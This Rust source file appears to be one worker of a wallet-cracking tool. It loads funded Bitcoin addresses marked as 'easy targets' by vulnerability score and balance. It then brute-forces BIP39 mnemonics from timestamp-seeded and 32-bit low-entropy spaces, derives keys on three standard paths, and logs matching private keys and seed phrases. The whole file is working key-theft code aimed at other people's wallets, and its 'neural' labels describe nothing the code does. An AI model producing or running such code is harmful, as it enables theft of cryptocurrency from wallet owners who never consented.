use anyhow::Result;
use bitcoin::bip32::{DerivationPath, ExtendedPrivKey};
use bitcoin::network::constants::Network;
use bitcoin::{Address, PublicKey, secp256k1::Secp256k1};
use bip39::Mnemonic;
use rusqlite::{params, Connection};
use std::collections::HashSet;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use rayon::prelude::*;

const DB_FILE: &str = "cryscout.db";

struct NeuralGenerator {
    targets: HashSet<String>,
    checked_count: AtomicU64,
}

fn load_easy_targets() -> Result<HashSet<String>> {
    let conn = Connection::open(DB_FILE)?;
    let _ = conn.pragma_update(None, "busy_timeout", &30000);
    let mut stmt = conn.prepare("SELECT address FROM addresses WHERE vulnerability_score > 5.0 AND balance >= 20.0")?;
    let rows = stmt.query_map([], |row| row.get::<_, String>(0))?;
    let mut targets = HashSet::new();
    for row in rows {
        targets.insert(row?);
    }
    println!("Loaded {} 'Easy' targets for neural scouting.", targets.len());
    Ok(targets)
}

fn log_hit(mnemonic: &str, path: &str, address: &str, privkey: &str) -> Result<()> {
    let conn = Connection::open(DB_FILE)?;
    let _ = conn.pragma_update(None, "busy_timeout", &30000);
    conn.execute(
        "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
        params![address, privkey, format!("NeuralScout: {}", path)],
    )?;
    println!("\n[!!!] NEURAL HIT! Address: {}, Path: {}, Mnemonic: {}", address, path, mnemonic);
    Ok(())
}

fn main() -> Result<()> {
    let targets = load_easy_targets()?;
    if targets.is_empty() {
        println!("No easy targets found. Waiting for Scorer/Analyzer...");
        return Ok(());
    }

    let gen = Arc::new(NeuralGenerator {
        targets,
        checked_count: AtomicU64::new(0),
    });

    let gen_monitor = Arc::clone(&gen);
    std::thread::spawn(move || {
        let conn = match Connection::open(DB_FILE) {
            Ok(c) => c,
            Err(_) => return,
        };
        let _ = conn.pragma_update(None, "busy_timeout", &30000);
        loop {
            std::thread::sleep(std::time::Duration::from_secs(60));
            let current_count = gen_monitor.checked_count.load(Ordering::Relaxed);
            let task_msg = format!("Neural Scouting ({} checked)", current_count);
            let _ = conn.execute(
                "INSERT OR REPLACE INTO worker_status (worker_id, task, cpu_usage, ram_usage, last_heartbeat)
                 VALUES (?1, ?2, ?3, ?4, datetime('now'))",
                params![format!("NeuralScout-{}", std::process::id()), task_msg, 0.0, 0.0],
            );
        }
    });

    let _ = rayon::ThreadPoolBuilder::new().num_threads(1).build_global();

    let secp = Secp256k1::new();
    let network = Network::Bitcoin;
    let paths = vec!["m/44'/0'/0'/0/0", "m/49'/0'/0'/0/0", "m/84'/0'/0'/0/0"];
    let parsed_paths: Vec<(DerivationPath, &str)> = paths.into_iter().map(|p| (p.parse().unwrap(), p)).collect();

    println!("Starting Neural Autocorrect Scouting...");

    // Strategy 1: Timestamp Seeding (Autocorrect for clock-based RNG failures)
    let eras = vec![
        (1230768000, 1356998400), // 2009 - 2012
        (1356998400, 1420070400), // 2013 - 2014
    ];

    for (start, end) in eras {
        println!("Scanning Era: {} to {}", start, end);
        (start..end).into_par_iter().step_by(100).for_each(|base_ts| {
            for ts in base_ts..base_ts + 100 {
                let mut entropy = [0u8; 16];
                let ts_bytes = (ts as u32).to_be_bytes();
                for i in 0..4 {
                    entropy[i*4..(i+1)*4].copy_from_slice(&ts_bytes);
                }

                if let Ok(mnemonic) = Mnemonic::from_entropy(&entropy) {
                    let seed = mnemonic.to_seed("");
                    let root = ExtendedPrivKey::new_master(network, &seed).unwrap();

                    for (path, path_str) in &parsed_paths {
                        let derived = root.derive_priv(&secp, path).unwrap();
                        let secret_key = derived.private_key;
                        let pubkey = PublicKey::new(secret_key.public_key(&secp));
                        
                        let address = if path_str.contains("44'") {
                            Address::p2pkh(&pubkey, network)
                        } else if path_str.contains("49'") {
                            Address::p2shwpkh(&pubkey, network).expect("P2SH")
                        } else {
                            Address::p2wpkh(&pubkey, network).expect("P2WPKH")
                        };

                        if gen.targets.contains(&address.to_string()) {
                            let phrase = mnemonic.to_string();
                            let _ = log_hit(&phrase, path_str, &address.to_string(), &hex::encode(secret_key.secret_bytes()));
                        }
                    }
                }
            }
            gen.checked_count.fetch_add(100, Ordering::Relaxed);
        });
    }

    // Strategy 2: Low-Entropy Buffer (Autocorrect for 32/64-bit entropy truncation)
    println!("Scanning Strategy: Low-Entropy Buffer (32-bit space)...");
    (0..u32::MAX).into_par_iter().step_by(1000).for_each(|base| {
        for i in 0..1000 {
            let val = base + i;
            let mut entropy = [0u8; 16];
            let bytes = val.to_le_bytes();
            entropy[0..4].copy_from_slice(&bytes);

            if let Ok(mnemonic) = Mnemonic::from_entropy(&entropy) {
                let seed = mnemonic.to_seed("");
                let root = ExtendedPrivKey::new_master(network, &seed).unwrap();
                for (path, path_str) in &parsed_paths {
                    let derived = root.derive_priv(&secp, path).unwrap();
                    let secret_key = derived.private_key;
                    let pubkey = PublicKey::new(secret_key.public_key(&secp));
                    
                    let address = if path_str.contains("44'") {
                        Address::p2pkh(&pubkey, network)
                    } else if path_str.contains("49'") {
                        Address::p2shwpkh(&pubkey, network).expect("P2SH")
                    } else {
                        Address::p2wpkh(&pubkey, network).expect("P2WPKH")
                    };

                    if gen.targets.contains(&address.to_string()) {
                        let phrase = mnemonic.to_string();
                        let _ = log_hit(&phrase, path_str, &address.to_string(), &hex::encode(secret_key.secret_bytes()));
                    }
                }
            }
        }
        if base % 1000000 == 0 {
            println!("[NeuralScout] Checked {} low-entropy combinations...", base);
        }
    });

    Ok(())
}
